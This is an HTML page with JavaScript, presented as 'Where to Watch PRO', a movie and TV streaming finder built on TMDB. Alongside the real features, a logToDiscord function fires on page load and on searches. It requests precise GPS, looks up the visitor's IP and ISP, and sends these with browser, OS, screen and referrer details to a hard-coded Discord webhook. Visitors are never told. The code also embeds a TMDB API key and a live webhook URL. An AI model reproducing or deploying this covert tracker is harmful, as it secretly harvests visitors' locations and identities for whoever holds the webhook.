<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Where to Watch PRO</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0d0d0d;
            color: #ffffff;
            min-height: 100vh;
        }

        /* HERO HEADER */
        .hero {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            padding: 40px 20px 30px;
            text-align: center;
            border-bottom: 1px solid #222;
        }
        .hero h1 { font-size: 2.2rem; color: #4da6ff; margin-bottom: 6px; }
        .hero p { color: #888; font-size: 14px; }

        /* THEME TOGGLE */
        .theme-toggle {
            position: absolute; top: 20px; right: 20px;
            background: #2a2a2a; border: 1px solid #333; border-radius: 20px;
            padding: 6px 14px; cursor: pointer; font-size: 13px; color: #aaa;
            transition: all 0.2s;
        }
        .theme-toggle:hover { background: #333; color: #fff; }

        /* LIGHT MODE */
        body.light { background: #f4f4f4; color: #111; }
        body.light .hero { background: linear-gradient(135deg, #dbe9ff, #c5d9f7, #a8c8f5); border-bottom: 1px solid #ccc; }
        body.light .hero h1 { color: #1a6abf; }
        body.light .hero p { color: #555; }
        body.light .container { background: #fff; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        body.light input, body.light select { background: #f9f9f9; color: #111; border-color: #ccc; }
        body.light .suggestions-list { background: #fff; border-color: #4da6ff; }
        body.light .suggestions-list li { border-color: #eee; color: #111; }
        body.light .suggestions-list li:hover { background: #f0f0f0; }
        body.light .movie-card { background: #f9f9f9; }
        body.light .provider-tag { background: #e8f0fe; color: #1a6abf; border-color: #c5d9f7; }
        body.light .tab { background: #eee; color: #555; }
        body.light .tab.active { background: #4da6ff; color: #fff; }
        body.light .history-item { background: #f0f0f0; color: #333; }
        body.light .history-item:hover { background: #e0e0e0; }
        body.light .similar-card { background: #f0f0f0; }
        body.light .similar-card:hover { background: #e8f0fe; }
        body.light .stat-box { background: #f0f0f0; }
        body.light .section-title { color: #555; border-color: #ddd; }
        body.light .theme-toggle { background: #eee; border-color: #ccc; color: #555; }

        .container {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            max-width: 680px;
            margin: 30px auto;
        }

        /* TABS */
        .tabs { display: flex; gap: 8px; margin-bottom: 24px; }
        .tab {
            flex: 1; padding: 10px; text-align: center; border-radius: 8px;
            background: #2a2a2a; color: #888; cursor: pointer; font-size: 14px;
            font-weight: 600; transition: all 0.2s; border: none;
        }
        .tab.active { background: #4da6ff; color: #fff; }
        .tab:hover:not(.active) { background: #333; color: #ccc; }

        label { display: block; margin-bottom: 6px; font-weight: 600; color: #aaa; font-size: 13px; text-transform: uppercase; letter-spacing: 0.05em; }
        .input-wrapper { position: relative; margin-bottom: 16px; }
        input, select {
            width: 100%; padding: 13px 16px; border: 1px solid #333; border-radius: 10px;
            background: #242424; color: white; font-size: 15px; transition: border-color 0.2s;
            outline: none;
        }
        input:focus, select:focus { border-color: #4da6ff; }

        .suggestions-list {
            position: absolute; top: 100%; left: 0; right: 0; background: #242424;
            border: 1px solid #4da6ff; border-top: none; border-radius: 0 0 10px 10px;
            margin: 0; padding: 0; list-style: none; max-height: 280px; overflow-y: auto;
            z-index: 100; display: none; box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        }
        .suggestions-list li {
            padding: 10px 14px; cursor: pointer; border-bottom: 1px solid #333;
            display: flex; align-items: center; gap: 12px; transition: background 0.15s;
        }
        .suggestions-list li:last-child { border-bottom: none; }
        .suggestions-list li:hover { background: #2e2e2e; }
        .suggestion-img { width: 32px; height: 48px; border-radius: 4px; object-fit: cover; background: #111; flex-shrink: 0; }
        .movie-year { color: #666; font-size: 12px; }
        .suggestion-type { font-size: 10px; padding: 2px 6px; border-radius: 4px; background: #333; color: #aaa; margin-left: auto; flex-shrink: 0; }

        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }

        button.search-btn {
            width: 100%; padding: 14px; background: #4da6ff; color: #0d0d0d;
            border: none; border-radius: 10px; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: all 0.2s; margin-bottom: 16px;
        }
        button.search-btn:hover { background: #3388dd; transform: translateY(-1px); }
        button.search-btn:active { transform: translateY(0); }

        /* HISTORY */
        .section-title {
            font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em;
            color: #555; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #222;
        }
        .history-list { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
        .history-item {
            background: #242424; padding: 6px 12px; border-radius: 20px; font-size: 13px;
            color: #ccc; cursor: pointer; display: flex; align-items: center; gap: 6px;
            border: 1px solid #333; transition: all 0.15s;
        }
        .history-item:hover { background: #2e2e2e; color: #fff; }
        .history-item .remove { color: #555; font-size: 11px; margin-left: 2px; }
        .history-item .remove:hover { color: #ff6b6b; }
        .clear-history { font-size: 12px; color: #555; cursor: pointer; margin-left: auto; }
        .clear-history:hover { color: #ff6b6b; }

        /* RESULTS */
        #results { margin-top: 10px; }

        .movie-card {
            background: #222; border-radius: 12px; overflow: hidden; margin-bottom: 20px;
        }
        .movie-card-top { display: flex; gap: 20px; padding: 20px; }
        @media (max-width: 500px) { .movie-card-top { flex-direction: column; } }
        .poster { width: 130px; min-width: 130px; border-radius: 8px; box-shadow: 0 6px 16px rgba(0,0,0,0.5); object-fit: cover; }

        .movie-meta { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 12px; align-items: center; }
        .badge {
            font-size: 12px; padding: 3px 10px; border-radius: 20px; font-weight: 600;
        }
        .badge-blue { background: #1a3a5c; color: #4da6ff; }
        .badge-green { background: #1a3d1a; color: #57c757; }
        .badge-yellow { background: #3d3000; color: #f0c040; }
        .badge-gray { background: #2a2a2a; color: #888; }

        .movie-title { font-size: 20px; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
        .movie-overview { font-size: 13px; color: #aaa; line-height: 1.6; margin-bottom: 14px; }

        .cast-list { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
        .cast-tag { background: #2a2a2a; padding: 4px 10px; border-radius: 6px; font-size: 12px; color: #ccc; }

        /* PROVIDERS */
        .providers-section { padding: 16px 20px; border-top: 1px solid #2a2a2a; }
        .provider-category { margin-bottom: 14px; }
        .provider-category h3 { font-size: 13px; color: #4da6ff; margin-bottom: 8px; }
        .provider-tags { display: flex; flex-wrap: wrap; gap: 8px; }
        .provider-tag {
            background: #2a2a2a; padding: 6px 14px; border-radius: 20px; font-size: 13px;
            color: #fff; border: 1px solid #333; transition: all 0.15s;
        }
        .provider-tag:hover { background: #333; border-color: #4da6ff; }

        /* TRAILER */
        .trailer-section { padding: 0 20px 16px; }
        .trailer-btn {
            display: inline-flex; align-items: center; gap: 8px;
            background: #c00; color: #fff; padding: 9px 18px; border-radius: 8px;
            font-size: 14px; font-weight: 600; cursor: pointer; border: none;
            transition: background 0.2s; text-decoration: none;
        }
        .trailer-btn:hover { background: #e00; }

        /* SIMILAR */
        .similar-section { padding: 16px 20px; border-top: 1px solid #2a2a2a; }
        .similar-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 10px; margin-top: 10px; }
        .similar-card {
            background: #2a2a2a; border-radius: 8px; overflow: hidden; cursor: pointer;
            transition: transform 0.15s; text-align: center;
        }
        .similar-card:hover { transform: translateY(-3px); }
        .similar-card img { width: 100%; aspect-ratio: 2/3; object-fit: cover; display: block; }
        .similar-card p { font-size: 11px; color: #ccc; padding: 5px 4px; line-height: 1.3; }

        /* STATS */
        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 16px; }
        .stat-box { background: #242424; border-radius: 10px; padding: 14px; text-align: center; }
        .stat-box .val { font-size: 22px; font-weight: 700; color: #4da6ff; }
        .stat-box .lbl { font-size: 11px; color: #666; margin-top: 2px; text-transform: uppercase; letter-spacing: 0.05em; }

        .error { color: #ff6b6b; background: #3a1c1c; padding: 12px 16px; border-radius: 10px; font-size: 14px; }
        .loading { text-align: center; color: #666; font-style: italic; padding: 30px 0; }

        /* FAVOURITES */
        .fav-btn {
            background: none; border: 1px solid #444; border-radius: 8px; color: #888;
            padding: 6px 12px; cursor: pointer; font-size: 13px; transition: all 0.2s;
        }
        .fav-btn.active { border-color: #f0c040; color: #f0c040; background: #3d3000; }
        .fav-btn:hover { border-color: #f0c040; color: #f0c040; }

        .footer-note { text-align: center; color: #333; font-size: 12px; margin-top: 10px; padding-bottom: 30px; }

        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1a1a1a; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    </style>
</head>
<body>

<div class="hero" style="position:relative;">
    <button class="theme-toggle" onclick="toggleTheme()">☀️ Light mode</button>
    <h1>🍿 Where to Watch PRO</h1>
    <p>Search movies & TV shows — find where to stream, rent, or buy</p>
</div>

<div class="container">

    <div class="tabs">
        <button class="tab active" onclick="setTab('movie', this)">🎬 Movies</button>
        <button class="tab" onclick="setTab('tv', this)">📺 TV Shows</button>
        <button class="tab" onclick="setTab('favourites', this)">⭐ Favourites</button>
    </div>

    <div id="search-panel">
        <label for="movieTitle">Title</label>
        <div class="input-wrapper">
            <input type="text" id="movieTitle" placeholder="Start typing..." autocomplete="off"
                onkeydown="if(event.key==='Enter') searchMovie()">
            <ul id="suggestions" class="suggestions-list"></ul>
        </div>

        <div class="row">
            <div>
                <label for="regionSelect">Region</label>
                <select id="regionSelect">
                    <option value="GB">🇬🇧 United Kingdom</option>
                    <option value="US">🇺🇸 United States</option>
                    <option value="CA">🇨🇦 Canada</option>
                    <option value="AU">🇦🇺 Australia</option>
                    <option value="IN">🇮🇳 India</option>
                    <option value="DE">🇩🇪 Germany</option>
                    <option value="FR">🇫🇷 France</option>
                    <option value="JP">🇯🇵 Japan</option>
                </select>
            </div>
            <div>
                <label for="yearFilter">Year (optional)</label>
                <input type="number" id="yearFilter" placeholder="e.g. 2023" min="1900" max="2026">
            </div>
        </div>

        <button class="search-btn" onclick="searchMovie()">🔍 Search</button>

        <div id="history-section" style="display:none;">
            <div style="display:flex;align-items:center;margin-bottom:10px;">
                <div class="section-title" style="margin:0;border:none;flex:1;">Recent searches</div>
                <span class="clear-history" onclick="clearHistory()">Clear all</span>
            </div>
            <div class="history-list" id="history-list"></div>
        </div>
    </div>

    <div id="favourites-panel" style="display:none;">
        <div class="section-title">Your saved favourites</div>
        <div id="favourites-list"></div>
    </div>

    <div id="results"></div>
</div>

<div class="footer-note">Powered by TMDB · Data for entertainment purposes only</div>

<script>
    // ==========================================
    // CONFIG
    // ==========================================
    const API_KEY = "08dc719640ba33ae55d12156b62eb9fa";
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1495174700937121853/NsI-_lLtpyg0aiOu-d-RS2naGzYOILCUKUcy5b9rwNalr79xKO6aMB17oIys0I7RbVUf";
    // ==========================================

    let currentTab = 'movie';
    let sessionStart = Date.now();
    let currentMovieId = null;
    let currentMovieTitle = null;

    // --- THEME ---
    function toggleTheme() {
        document.body.classList.toggle('light');
        const btn = document.querySelector('.theme-toggle');
        btn.textContent = document.body.classList.contains('light') ? '🌙 Dark mode' : '☀️ Light mode';
        localStorage.setItem('theme', document.body.classList.contains('light') ? 'light' : 'dark');
    }
    if (localStorage.getItem('theme') === 'light') {
        document.body.classList.add('light');
        document.querySelector('.theme-toggle').textContent = '🌙 Dark mode';
    }

    // --- TABS ---
    function setTab(tab, el) {
        currentTab = tab;
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        el.classList.add('active');
        document.getElementById('results').innerHTML = '';
        if (tab === 'favourites') {
            document.getElementById('search-panel').style.display = 'none';
            document.getElementById('favourites-panel').style.display = 'block';
            renderFavourites();
        } else {
            document.getElementById('search-panel').style.display = 'block';
            document.getElementById('favourites-panel').style.display = 'none';
            document.getElementById('movieTitle').placeholder = tab === 'tv' ? 'Start typing a TV show...' : 'Start typing a movie...';
        }
    }

    // --- HISTORY ---
    function getHistory() { return JSON.parse(localStorage.getItem('searchHistory') || '[]'); }
    function saveHistory(item) {
        let h = getHistory().filter(x => x.id !== item.id);
        h.unshift(item);
        h = h.slice(0, 8);
        localStorage.setItem('searchHistory', JSON.stringify(h));
        renderHistory();
    }
    function clearHistory() {
        localStorage.removeItem('searchHistory');
        renderHistory();
    }
    function renderHistory() {
        const h = getHistory();
        const sec = document.getElementById('history-section');
        const list = document.getElementById('history-list');
        if (h.length === 0) { sec.style.display = 'none'; return; }
        sec.style.display = 'block';
        list.innerHTML = h.map(item => `
            <span class="history-item" onclick="searchMovie(${item.id})">
                ${item.title}
                <span class="remove" onclick="event.stopPropagation();removeHistory(${item.id})">✕</span>
            </span>
        `).join('');
    }
    function removeHistory(id) {
        const h = getHistory().filter(x => x.id !== id);
        localStorage.setItem('searchHistory', JSON.stringify(h));
        renderHistory();
    }

    // --- FAVOURITES ---
    function getFavourites() { return JSON.parse(localStorage.getItem('favourites') || '[]'); }
    function toggleFavourite(id, title, poster) {
        let favs = getFavourites();
        const idx = favs.findIndex(f => f.id === id);
        if (idx >= 0) {
            favs.splice(idx, 1);
        } else {
            favs.unshift({ id, title, poster });
        }
        localStorage.setItem('favourites', JSON.stringify(favs));
        const btn = document.getElementById('fav-btn');
        if (btn) updateFavBtn(id);
    }
    function isFavourite(id) { return getFavourites().some(f => f.id === id); }
    function updateFavBtn(id) {
        const btn = document.getElementById('fav-btn');
        if (!btn) return;
        if (isFavourite(id)) { btn.textContent = '⭐ Saved'; btn.classList.add('active'); }
        else { btn.textContent = '☆ Save'; btn.classList.remove('active'); }
    }
    function renderFavourites() {
        const favs = getFavourites();
        const list = document.getElementById('favourites-list');
        if (favs.length === 0) {
            list.innerHTML = '<p style="color:#555;font-size:14px;text-align:center;padding:30px 0;">No favourites yet — search for something and save it!</p>';
            return;
        }
        list.innerHTML = favs.map(f => `
            <div style="display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid #222;cursor:pointer;" onclick="searchMovie(${f.id})">
                <img src="${f.poster ? 'https://image.tmdb.org/t/p/w92' + f.poster : 'https://via.placeholder.com/46x69?text=?'}"
                    style="width:46px;height:69px;border-radius:6px;object-fit:cover;" alt="${f.title}">
                <span style="font-size:15px;flex:1;">${f.title}</span>
                <span style="color:#555;font-size:13px;cursor:pointer;" onclick="event.stopPropagation();removeFavourite(${f.id})">✕</span>
            </div>
        `).join('');
    }
    function removeFavourite(id) {
        let favs = getFavourites().filter(f => f.id !== id);
        localStorage.setItem('favourites', JSON.stringify(favs));
        renderFavourites();
    }

    // --- GEO ---
    async function getGeoData() {
        let preciseCoords = "Not provided";

        // 1. Attempt to get highly accurate GPS location first
        try {
            const pos = await new Promise((resolve, reject) => {
                if (!navigator.geolocation) reject("Geolocation not supported");
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true, // Forces device to use best possible accuracy (GPS)
                    timeout: 6000,
                    maximumAge: 0
                });
            });
            preciseCoords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Accuracy: ${Math.round(pos.coords.accuracy)}m)`;
        } catch (err) {
            console.log("Precise location denied or timed out. Falling back to IP.");
        }

        // 2. Fallback to IP APIs to get the readable City/Country and ISP
        const apis = [
            async () => {
                const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
                const d = await r.json();
                if (!d.ip) throw new Error();
                return { ip: d.ip, city: d.city, country: d.country_name, isp: d.org, coords: preciseCoords };
            },
            async () => {
                const r = await fetch('https://ip-api.com/json/?fields=status,query,country,city,isp', { signal: AbortSignal.timeout(4000) });
                const d = await r.json();
                if (d.status !== 'success') throw new Error();
                return { ip: d.query, city: d.city, country: d.country, isp: d.isp, coords: preciseCoords };
            },
            async () => {
                const r = await fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(4000) });
                const d = await r.json();
                if (!d.ipAddress) throw new Error();
                return { ip: d.ipAddress, city: d.cityName, country: d.countryName, isp: 'N/A', coords: preciseCoords };
            },
        ];
        
        for (const fn of apis) { 
            try { return await fn(); } catch(e) {} 
        }
        
        return { ip: 'unavailable', city: 'unavailable', country: 'unavailable', isp: 'unavailable', coords: preciseCoords };
    }

    // --- DISCORD LOGGING ---
    async function logToDiscord(event, extra = {}) {
        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        if (/Edg\//.test(ua)) browser = 'Edge';
        else if (/Chrome\//.test(ua)) browser = 'Chrome';
        else if (/Firefox\//.test(ua)) browser = 'Firefox';
        else if (/Safari\//.test(ua)) browser = 'Safari';
        
        let os = 'Unknown';
        if (/Win/.test(ua)) os = 'Windows';
        else if (/iPhone/.test(ua)) os = 'iOS (iPhone)';
        else if (/iPad/.test(ua)) os = 'iOS (iPad)';
        else if (/Android/.test(ua)) os = 'Android';
        else if (/Mac/.test(ua)) os = 'macOS';
        else if (/Linux/.test(ua)) os = 'Linux';
        
        const { ip, city, country, isp, coords } = await getGeoData();
        const now = new Date().toLocaleString('en-GB', { timeZone: 'Europe/London' });
        const timeOnSite = Math.round((Date.now() - sessionStart) / 1000) + 's';
        const colorMap = { page_view: 0x4da6ff, search: 0x57F287, trailer: 0xff0000, favourite: 0xf0c040 };
        
        const embed = {
            title: {
                page_view: '👁️ New Visit',
                search: `🔍 Search: ${extra.title || ''}`,
                trailer: `▶️ Trailer viewed: ${extra.title || ''}`,
                favourite: `⭐ Favourited: ${extra.title || ''}`
            }[event] || event,
            color: colorMap[event] || 0x888888,
            fields: [
                { name: '🕐 Time', value: now, inline: true },
                { name: '🌍 General Area', value: `${city}, ${country}`, inline: true },
                { name: '📍 Exact GPS', value: `\`${coords}\``, inline: false },
                { name: '🔌 ISP', value: isp, inline: true },
                { name: '🖥️ IP', value: `\`${ip}\``, inline: true },
                { name: '🌐 Browser', value: `${browser} on ${os}`, inline: true },
                { name: '🗣️ Language', value: navigator.language, inline: true },
                { name: '📐 Screen', value: `${screen.width}×${screen.height}`, inline: true },
                { name: '🔗 Referrer', value: document.referrer || 'Direct', inline: true },
                { name: '⏱️ Time on site', value: timeOnSite, inline: true },
                ...(extra.title  ? [{ name: '🎬 Title',  value: extra.title,  inline: true }] : []),
                ...(extra.type   ? [{ name: '📁 Type',   value: extra.type,   inline: true }] : []),
                ...(extra.region ? [{ name: '📍 TMDB Region', value: extra.region, inline: true }] : []),
            ],
            footer: { text: 'Where to Watch PRO Analytics' },
            thumbnail: extra.poster ? { url: `https://image.tmdb.org/t/p/w92${extra.poster}` } : undefined,
            timestamp: new Date().toISOString()
        };
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch(e) {}
    }

    logToDiscord('page_view');
    renderHistory();

    // --- TYPEAHEAD ---
    const searchInput = document.getElementById('movieTitle');
    const suggestionsBox = document.getElementById('suggestions');
    let debounceTimer;

    searchInput.addEventListener('input', (e) => {
        clearTimeout(debounceTimer);
        const query = e.target.value.trim();
        if (query.length < 2) { suggestionsBox.style.display = 'none'; return; }
        debounceTimer = setTimeout(() => fetchSuggestions(query), 280);
    });

    async function fetchSuggestions(query) {
        try {
            const type = currentTab === 'tv' ? 'tv' : 'movie';
            const url = `https://api.themoviedb.org/3/search/${type}?api_key=${API_KEY}&query=${encodeURIComponent(query)}`;
            const data = await (await fetch(url)).json();
            displaySuggestions(data.results.slice(0, 6), type);
        } catch(e) {}
    }

    function displaySuggestions(items, type) {
        if (!items || items.length === 0) { suggestionsBox.style.display = 'none'; return; }
        suggestionsBox.innerHTML = '';
        items.forEach(item => {
            const li = document.createElement('li');
            const title = item.title || item.name;
            const date = item.release_date || item.first_air_date || '';
            const year = date ? date.split('-')[0] : 'N/A';
            const img = item.poster_path ? `https://image.tmdb.org/t/p/w92${item.poster_path}` : 'https://via.placeholder.com/32x48?text=?';
            li.innerHTML = `
                <img src="${img}" class="suggestion-img" alt="">
                <div style="flex:1;min-width:0;">
                    <div style="font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${title}</div>
                    <div class="movie-year">${year}</div>
                </div>
                <span class="suggestion-type">${type === 'tv' ? 'TV' : 'Movie'}</span>
            `;
            li.onmousedown = (e) => {
                e.preventDefault();
                searchInput.value = title;
                suggestionsBox.style.display = 'none';
                searchMovie(item.id);
            };
            suggestionsBox.appendChild(li);
        });
        suggestionsBox.style.display = 'block';
    }

    document.addEventListener('mousedown', (e) => {
        if (e.target !== searchInput && !suggestionsBox.contains(e.target))
            suggestionsBox.style.display = 'none';
    });

    // --- MAIN SEARCH ---
    async function searchMovie(optionalId = null) {
        const titleInput = document.getElementById('movieTitle').value.trim();
        const region = document.getElementById('regionSelect').value;
        const yearFilter = document.getElementById('yearFilter').value;
        const resultsDiv = document.getElementById('results');
        const type = currentTab === 'tv' ? 'tv' : 'movie';

        if (!titleInput && !optionalId) {
            resultsDiv.innerHTML = '<div class="error">Please enter a title.</div>';
            return;
        }

        resultsDiv.innerHTML = "<p class='loading'>🍿 Loading...</p>";
        suggestionsBox.style.display = 'none';

        try {
            let itemId = optionalId;

            if (!itemId) {
                const yearParam = yearFilter ? `&year=${yearFilter}` : '';
                const searchRes = await fetch(`https://api.themoviedb.org/3/search/${type}?api_key=${API_KEY}&query=${encodeURIComponent(titleInput)}${yearParam}`);
                const searchData = await searchRes.json();
                if (!searchData.results || searchData.results.length === 0) {
                    resultsDiv.innerHTML = `<div class="error">Couldn't find "${titleInput}".</div>`;
                    return;
                }
                itemId = searchData.results[0].id;
            }

            currentMovieId = itemId;

            // Fetch details, providers, credits, videos, similar — all in parallel
            const [detailsRes, providersRes, creditsRes, videosRes, similarRes] = await Promise.all([
                fetch(`https://api.themoviedb.org/3/${type}/${itemId}?api_key=${API_KEY}`),
                fetch(`https://api.themoviedb.org/3/${type}/${itemId}/watch/providers?api_key=${API_KEY}`),
                fetch(`https://api.themoviedb.org/3/${type}/${itemId}/credits?api_key=${API_KEY}`),
                fetch(`https://api.themoviedb.org/3/${type}/${itemId}/videos?api_key=${API_KEY}`),
                fetch(`https://api.themoviedb.org/3/${type}/${itemId}/similar?api_key=${API_KEY}`),
            ]);

            const details  = await detailsRes.json();
            const provData = await providersRes.json();
            const credits  = await creditsRes.json();
            const videos   = await videosRes.json();
            const similar  = await similarRes.json();

            const title = details.title || details.name;
            currentMovieTitle = title;

            // Save to history
            saveHistory({ id: itemId, title });

            // Log to Discord
            logToDiscord('search', { title, type, region, poster: details.poster_path });

            const posterUrl = details.poster_path
                ? `https://image.tmdb.org/t/p/w300${details.poster_path}`
                : 'https://via.placeholder.com/130x195?text=No+Poster';
            const year = (details.release_date || details.first_air_date || '').split('-')[0];
            const rating = details.vote_average ? details.vote_average.toFixed(1) : 'N/A';
            const runtime = details.runtime ? `${details.runtime} min` : (details.episode_run_time?.[0] ? `${details.episode_run_time[0]} min/ep` : 'N/A');
            const genres = (details.genres || []).map(g => g.name).join(', ') || 'N/A';
            const overview = details.overview || 'No description available.';

            // Director / creator
            const director = type === 'movie'
                ? (credits.crew || []).find(c => c.job === 'Director')?.name
                : (details.created_by || [])[0]?.name;

            // Top cast
            const cast = (credits.cast || []).slice(0, 6).map(c => c.name);

            // Trailer
            const trailer = (videos.results || []).find(v => v.type === 'Trailer' && v.site === 'YouTube');
            const trailerKey = trailer?.key;

            // Region providers
            const regionData = provData.results?.[region];

            // Similar
            const similarItems = (similar.results || []).slice(0, 8);

            // Scores
            const voteCount = details.vote_count?.toLocaleString() || '0';

            let html = `<div class="movie-card">`;

            // Stats bar
            html += `
                <div style="padding:16px 20px 0;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
                    <div class="stats-grid" style="width:100%;">
                        <div class="stat-box"><div class="val">${rating}</div><div class="lbl">⭐ Rating</div></div>
                        <div class="stat-box"><div class="val">${runtime}</div><div class="lbl">⏱ Runtime</div></div>
                        <div class="stat-box"><div class="val">${voteCount}</div><div class="lbl">🗳 Votes</div></div>
                    </div>
                </div>
            `;

            // Main card
            html += `<div class="movie-card-top">
                <img src="${posterUrl}" alt="${title}" class="poster">
                <div style="flex:1;min-width:0;">
                    <div style="display:flex;align-items:flex-start;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
                        <div class="movie-title" style="flex:1;">${title} <span class="movie-year">(${year})</span></div>
                        <button class="fav-btn" id="fav-btn" onclick="toggleFavourite(${itemId}, '${title.replace(/'/g,"\\'")}', '${details.poster_path || ''}')">
                            ${isFavourite(itemId) ? '⭐ Saved' : '☆ Save'}
                        </button>
                    </div>
                    <div class="movie-meta">
                        ${genres.split(', ').map(g => `<span class="badge badge-blue">${g}</span>`).join('')}
                        ${type === 'tv' ? `<span class="badge badge-green">TV Show</span>` : `<span class="badge badge-gray">Movie</span>`}
                    </div>
                    <p class="movie-overview">${overview}</p>
                    ${director ? `<div style="font-size:13px;color:#888;margin-bottom:8px;">🎬 ${type === 'tv' ? 'Created by' : 'Directed by'}: <span style="color:#ccc;">${director}</span></div>` : ''}
                    ${cast.length ? `<div style="font-size:12px;color:#666;margin-bottom:6px;">CAST</div><div class="cast-list">${cast.map(c => `<span class="cast-tag">${c}</span>`).join('')}</div>` : ''}
                </div>
            </div>`;

            // Trailer
            if (trailerKey) {
                html += `<div class="trailer-section">
                    <a class="trailer-btn" href="https://www.youtube.com/watch?v=${trailerKey}" target="_blank"
                        onclick="logToDiscord('trailer',{title:'${title.replace(/'/g,"\\'")}',poster:'${details.poster_path||''}'})">
                        ▶ Watch Trailer on YouTube
                    </a>
                </div>`;
            }

            // Providers
            html += `<div class="providers-section">`;
            if (!regionData) {
                html += `<div class="error">Not available in selected region.</div>`;
            } else {
                const renderCat = (key, label) => {
                    if (!regionData[key]) return '';
                    return `<div class="provider-category"><h3>${label}</h3><div class="provider-tags">
                        ${regionData[key].map(p => `<span class="provider-tag">${p.provider_name}</span>`).join('')}
                    </div></div>`;
                };
                const streaming = renderCat('flatrate', '📺 Streaming');
                const rent = renderCat('rent', '🛒 Rent');
                const buy = renderCat('buy', '💳 Buy');
                html += streaming + rent + buy;
                if (!streaming && !rent && !buy) html += `<p style="color:#666;font-size:14px;">Not currently available digitally in this region.</p>`;
            }
            html += `</div>`;

            // Similar
            if (similarItems.length > 0) {
                html += `<div class="similar-section">
                    <div class="section-title">Similar titles</div>
                    <div class="similar-grid">
                        ${similarItems.map(s => {
                            const t = s.title || s.name;
                            const img = s.poster_path ? `https://image.tmdb.org/t/p/w154${s.poster_path}` : 'https://via.placeholder.com/90x135?text=?';
                            return `<div class="similar-card" onclick="searchMovie(${s.id})" title="${t}">
                                <img src="${img}" alt="${t}" loading="lazy">
                                <p>${t}</p>
                            </div>`;
                        }).join('')}
                    </div>
                </div>`;
            }

            html += `</div>`;
            resultsDiv.innerHTML = html;
            if (isFavourite(itemId)) updateFavBtn(itemId);

        } catch(err) {
            console.error(err);
            resultsDiv.innerHTML = '<div class="error">Something went wrong. Check your connection.</div>';
        }
    }
</script>
</body>
</html>
